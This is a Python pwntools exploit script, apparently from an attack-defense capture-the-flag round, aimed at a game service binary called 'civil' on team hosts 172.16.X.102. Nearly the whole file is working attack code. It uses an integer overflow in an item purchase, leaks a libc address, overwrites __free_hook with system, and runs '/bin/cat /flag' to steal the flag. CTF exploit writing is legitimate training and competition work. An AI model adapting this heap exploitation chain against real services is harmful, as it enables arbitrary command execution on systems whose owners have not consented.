#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author: l1nk & A1Lin

import sys
import requests

from pwn import *


def reg(p,username, password):
    p.recvuntil("Your choice:")
    p.sendline("1")
    p.recvuntil("Input your username:")
    p.send(username)
    p.recvuntil("Input your password:")
    p.send(password)


def login(p,username, password):
    p.recvuntil("Your choice:")
    p.sendline('2')
    p.recvuntil("Input your username:")
    p.send(username)
    p.recvuntil("Input your password:")
    p.send(password)
    return p.recvline()

def name_city(p,name,length):
    p.recvuntil("Your choice:")
    p.sendline('1')
    p.recvuntil("Input the length of the name:")
    p.sendline(str(length))
    p.recvuntil("Input the name:")
    p.sendline(name)

def buy(p,i,name,num):
    p.recvuntil("Your choice:")
    p.sendline('2')
    p.recvuntil("Which shop:")
    p.sendline(str(i))
    p.recvuntil("What item you want to buy?")
    p.send(name+'\x00')
    p.recvuntil("How much do you want to buy?")
    p.sendline(str(num))

def sell(p,name,num):
    p.recvuntil("Your choice:")
    p.sendline('3')
    p.recvuntil("Which item do you want to sell:")
    p.send(name +'\x00')
    p.recvuntil("How many do you want to sell:")
    p.sendline(str(num))
    p.recvuntil("How do you like this item:")
    p.sendline('A1Lin')

def recruit_new_soliders(p,num,name):
    p.recvuntil("Your choice:")
    p.sendline("1")
    p.recvuntil("How many soldier do you want to recruit:")
    p.sendline(str(num))
    p.recvuntil("Input the name of the new troop:")
    p.sendline(name)


def reanme_city(p,length, name):
    p.recvuntil("Your choice:")
    p.sendline('2')
    p.recvuntil("Input the length of the name:")
    p.sendline(str(length))
    p.recvuntil("Input the name:")
    p.send(name)

def show_city(p):
    p.recvuntil("Your choice:")
    p.sendline('5')
    p.recvuntil("City name:")
    addr = p.recv(6).ljust(8,'\x00')
    #print addr
    addr = u64(addr)
    return addr

def battle(p):
    p.recvuntil("Your choice:")
    p.sendline('6')
    p.recvuntil("Do you want to be capricious?")
    p.sendline('y')
    p.recvuntil("Gift for you:")
    heap_addr = p.recv(12)
    #print heap_addr
    heap_addr = int(heap_addr,16)
    p.send('\x00'*8)
    p.send('\x00'*8)
    p.interactive()
    return heap_addr



def pwn(ip,port,local):
    free_hook = 0x00000000003BEA30
    system = 0x0000000000042020
    if not local:
        p = remote(ip,port, timeout=3)

    else:
        p = process("./civil")

    reg(p,"A1Lin","A1Lin")
    login(p,"A1Lin","A1Lin")
    p.recvuntil("Your choice:")
    p.sendline('4')
    name_city(p,"A1Lin",256)
    p.recvuntil("Your choice:")
    p.sendline('3')
    buy(p,2,'Healing medicine',288230376151711744)
    sell(p,'Healing medicine',1)
    p.recvuntil("Your choice:")
    p.sendline('4')
    p.sendline("4")
    recruit_new_soliders(p,70000,"/bin/cat /flag\x00")
    p.recvuntil("Your choice:")
    p.sendline("3")
    for i in range(20):
        reanme_city(p,256,'hack by A1Lin')
    reanme_city(p,256,'\x10')
    addr = show_city(p)
    for i in range(20):
        reanme_city(p,256,'hack by A1Lin')
    libc = addr - 0x3BC710
    free_hook += libc
    system += libc
    print hex(libc)
    #print hex(free_hook)
    p.recvuntil("Your choice:")
    p.sendline('6')
    p.recvuntil("Do you want to be capricious?")
    p.sendline('y')
    p.recvuntil("Gift for you:")
    heap_addr = p.recv(12)
    #print heap_addr
    heap_addr = int(heap_addr,16)
    offset = free_hook - heap_addr
    p.send(p64(offset))
    sleep(0.1)
    p.send(p64(system))
    p.sendline('4')
    p.recvuntil("Your choice:")
    p.sendline("2")
    #gdb.attach(p)
    p.recvuntil("First:")
    p.send("/bin/cat /flag\x00")
    p.recvuntil("Second:")
    p.send("/bin/cat /flag\x00")
    flag = p.recvline()
    p.close()
    print flag
    return flag

def get_flag(host,port):
    return pwn(host, port ,0)

def main():
    get_flag("172.16.%s.102" % (sys.argv[1]), "20002")

if __name__ == "__main__":
    main()
